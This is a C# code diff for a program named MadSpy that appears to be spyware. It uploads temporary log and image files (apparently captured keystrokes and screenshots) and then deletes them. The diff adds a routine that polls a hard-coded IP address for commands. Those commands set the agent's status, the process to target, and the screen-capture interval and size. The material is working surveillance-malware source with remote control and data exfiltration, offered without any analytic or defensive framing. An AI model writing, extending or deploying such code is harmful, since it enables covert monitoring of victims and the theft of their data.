@@ -16,9 +16,11 @@ namespace MadSpy
             while (true)
             {
                 string agent;
+                Status status;
                 lock (Program.DATALOCK)
                 {
                     agent = data.Agent;
+                    status = data.Status;
                 }
 
                 if (agent.ToUpper().Equals("MADSPY"))
@@ -27,19 +29,24 @@ namespace MadSpy
                 string log = Path.GetTempPath() + "log.txt";
                 string img = Path.GetTempPath() + "img.html";
 
-                lock (Program.LOGLOCK)
+                if (status == Status.Active)
                 {
-                    if (File.Exists(log))
-                        FromAgent(data, log);
-                    File.Delete(log);
+                    lock (Program.LOGLOCK)
+                    {
+                        if (File.Exists(log))
+                            FromAgent(data, log);
+                        File.Delete(log);
+                    }
+
+                    lock (Program.IMGLOCK)
+                    {
+                        if (File.Exists(img))
+                            FromAgent(data, img);
+                        File.Delete(img);
+                    }
                 }
 
-                lock (Program.IMGLOCK)
-                {
-                    if (File.Exists(img))
-                        FromAgent(data, img);
-                    File.Delete(img);
-                }
+                ToAgent(data);
 
                 Thread.Sleep(120000);
             }
@@ -99,16 +106,67 @@ namespace MadSpy
             }
         }
 
+        private static void ToAgent(Data data)
+        {
+            try
+            {
+                string agent;
+                lock (Program.DATALOCK)
+                {
+                    agent = data.Agent;
+                }
+
+                string response = Get("http://34.253.187.225/" + agent + "/toagent.php");
+
+                foreach (string entry in response.Split(';')) 
+                {
+                    lock (Program.DATALOCK)
+                    {
+                        switch (entry.Split(':')[0])
+                        {
+                            case "Status":
+                                Status status;
+                                Enum.TryParse(entry.Split(':')[1], out status);
+                                data.Status = status;
+                                break;
+                            case "TargetProcess":
+                                data.TargetProcess = entry.Split(':')[1];
+                                break;
+                            case "ScreenCapturerInterval":
+                                data.ScreenCapturerInterval = Int32.Parse(entry.Split(':')[1]);
+                                break;
+                            case "ScreenWidth":
+                                data.ScreenWidth = Int32.Parse(entry.Split(':')[1]);
+                                break;
+                            case "ScreenHeight":
+                                data.ScreenHeight = Int32.Parse(entry.Split(':')[1]);
+                                break;
+                        }
+                    }
+                }
+            }
+            catch (Exception e)
+            {
+                Thread.Sleep(300000);
+
+                ToAgent(data);
+            }
+        }
+
         private static string Get(string uri)
         {
             HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
             request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
 
             using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-            using (Stream stream = response.GetResponseStream())
-            using (StreamReader reader = new StreamReader(stream))
             {
-                return reader.ReadToEnd();
+                using (Stream stream = response.GetResponseStream())
+                {
+                    using (StreamReader reader = new StreamReader(stream))
+                    {
+                        return reader.ReadToEnd();
+                    }
+                }
             }
         }
 
@@ -128,10 +186,14 @@ namespace MadSpy
             }
 
             using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
-            using (Stream stream = response.GetResponseStream())
-            using (StreamReader reader = new StreamReader(stream))
             {
-                return reader.ReadToEnd();
+                using (Stream stream = response.GetResponseStream())
+                {
+                    using (StreamReader reader = new StreamReader(stream))
+                    {
+                        return reader.ReadToEnd();
+                    }
+                }
             }
         }
     }
